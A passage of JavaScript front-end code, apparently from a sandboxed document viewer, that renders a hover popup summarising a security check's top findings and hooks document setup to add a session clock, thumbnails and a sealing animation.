  const r = check.report;
  if (!r || check.running || check.attacked) return;
  const order = { high: 0, medium: 1, low: 2, info: 3 };
  const top = (r.findings || []).filter((f) => f.severity !== "info").sort((a, b) => order[a.severity] - order[b.severity]);
  const seen = new Set();
  const uniq = top.filter((f) => !seen.has(f.title) && seen.add(f.title)).slice(0, 4);
  const p = $("peek");
  const head = el("div", `peek-head ${verdictClass(r.verdict)}`);
  head.append(el("strong", "", r.headline || r.verdict), el("span", "", `${r.seconds?.toFixed?.(1) ?? "?"} s · 2 VMs`));
  const list = el("ul", "");
  for (const f of uniq) {
    const li = el("li", "");
    li.append(el("span", `sev ${f.severity}`, f.severity === "medium" ? "med" : f.severity), el("span", "", f.title || f.what));
    list.append(li);
  }
  p.replaceChildren(head, ...(uniq.length ? [list] : [el("p", "note", "Nothing risky found.")]), el("p", "peek-foot", "Click for the full report"));
  const b = $("check").getBoundingClientRect();
  p.style.left = `${Math.max(8, Math.min(window.innerWidth - 340, b.left))}px`;
  p.style.top = `${b.bottom + 8}px`;
  p.hidden = false;
}
$("check").addEventListener("mouseenter", () => { clearTimeout(peekTimer); peekTimer = setTimeout(showPeek, 250); });
$("check").addEventListener("mouseleave", () => { clearTimeout(peekTimer); $("peek").hidden = true; });
$("check").addEventListener("click", () => { $("peek").hidden = true; });

// ---------------------------------------------------------------- opening
// Hook into document setup: session clock, thumbnails, sealing transition.
const setupDocumentBase = setupDocument;
setupDocument = function (info) {
  setupDocumentBase(info);
  session.t0 = Date.now();
  thumbs.list = [];
  thumbs.current = -1;
  $("thumbbtn").hidden = false;
  if (pref("airlock.thumbs", "0") === "1") setThumbs(true);
  else $("thumbs").hidden = true;
  const v = $("viewer");
  v.classList.remove("sealing");
  void v.offsetWidth;
  v.classList.add("sealing");
  setTimeout(() => v.classList.remove("sealing"), 900);
  renderTelemetry();
};
